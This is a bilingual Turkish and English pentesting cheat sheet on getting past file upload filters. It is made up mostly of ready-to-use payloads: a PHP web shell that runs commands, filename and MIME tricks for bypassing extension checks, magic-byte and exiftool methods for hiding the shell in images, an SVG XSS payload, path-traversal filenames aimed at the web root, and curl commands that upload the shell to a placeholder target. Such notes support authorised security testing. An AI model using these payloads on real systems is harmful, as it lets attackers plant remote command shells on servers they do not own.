# 📁 File Upload

## 🇹🇷 Türkçe

### Kontrol Listesi

| # | Test | Açıklama | Durum |
|---|------|----------|-------|
| 1 | Extension Bypass | Uzantı filtresi atlama | ⬜ |
| 2 | MIME Type | Content-Type manipülasyonu | ⬜ |
| 3 | Magic Bytes | Dosya başlığı ekleme | ⬜ |
| 4 | Double Extension | Çift uzantı | ⬜ |
| 5 | Null Byte | Null karakter enjeksiyonu | ⬜ |
| 6 | Path Traversal | Dizin atlama | ⬜ |
| 7 | SVG XSS | SVG ile script | ⬜ |
| 8 | Polyglot Files | Çoklu format dosyalar | ⬜ |

### Extension Bypass Payloads

```
# PHP
shell.php.jpg
shell.php.png
shell.pHp
shell.pHP5
shell.php%00.jpg
shell.php%20
shell.php.
shell.php....
shell.php::$DATA

# ASP
shell.asp;.jpg
shell.aspx;.jpg
shell.aspx%00.jpg

# JSP
shell.jsp%00.jpg
shell.jspx
```

### MIME Type Manipulation

```bash
# Normal upload
Content-Type: application/x-php

# Bypass attempt
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes (File Signatures)

```bash
# GIF
GIF89a;<?php system($_GET['cmd']); ?>

# PNG
echo -e '\x89PNG\r\n\x1a\n' | cat - shell.php > shell.png.php

# JPEG
echo -e '\xFF\xD8\xFF\xE0' | cat - shell.php > shell.jpg.php

# PDF
%PDF-1.5
<?php system($_GET['cmd']); ?>
```

### SVG XSS Payload

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

### Komutlar

```bash
# Basit PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Magic bytes ekle (GIF)
(echo -n 'GIF89a'; cat shell.php) > shell.gif.php

# Magic bytes ekle (PNG)
(echo -ne '\x89PNG\r\n\x1a\n'; cat shell.php) > shell.png.php

# Curl ile upload test
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload

# Curl ile filename manipulation
curl -F "file=@shell.php;filename=shell.php.jpg" http://target.com/upload

# Exiftool ile metadata'ya shell ekle
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

### Path Traversal in Upload

```
filename="../../../var/www/html/shell.php"
filename="..%2F..%2F..%2Fvar/www/html/shell.php"
filename="....//....//....//var/www/html/shell.php"
```

### İpuçları

1. **Yüklenen dosyanın konumunu bul**
   - Response'da path var mı?
   - Predictable naming? (timestamp, md5)
   
2. **Whitelist vs Blacklist**
   - Blacklist → bypass daha kolay
   - Whitelist → magic bytes + double ext dene

3. **Resize/processing varsa**
   - Polyglot file dene
   - Metadata'ya shell yerleştir

---

## 🇬🇧 English

### Checklist

| # | Test | Description | Status |
|---|------|-------------|--------|
| 1 | Extension Bypass | Bypass extension filter | ⬜ |
| 2 | MIME Type | Content-Type manipulation | ⬜ |
| 3 | Magic Bytes | File header injection | ⬜ |
| 4 | Double Extension | Double extension | ⬜ |
| 5 | Null Byte | Null character injection | ⬜ |
| 6 | Path Traversal | Directory traversal | ⬜ |
| 7 | SVG XSS | Script via SVG | ⬜ |
| 8 | Polyglot Files | Multi-format files | ⬜ |

### Commands

```bash
# Simple PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Add magic bytes (GIF)
(echo -n 'GIF89a'; cat shell.php) > shell.gif.php

# Upload with curl
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload

# Metadata shell injection
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### Tips

1. **Find upload location**
   - Path in response?
   - Predictable naming?
   
2. **Whitelist vs Blacklist**
   - Blacklist → easier bypass
   - Whitelist → try magic bytes + double ext

---

[← Back to README](../README.md)
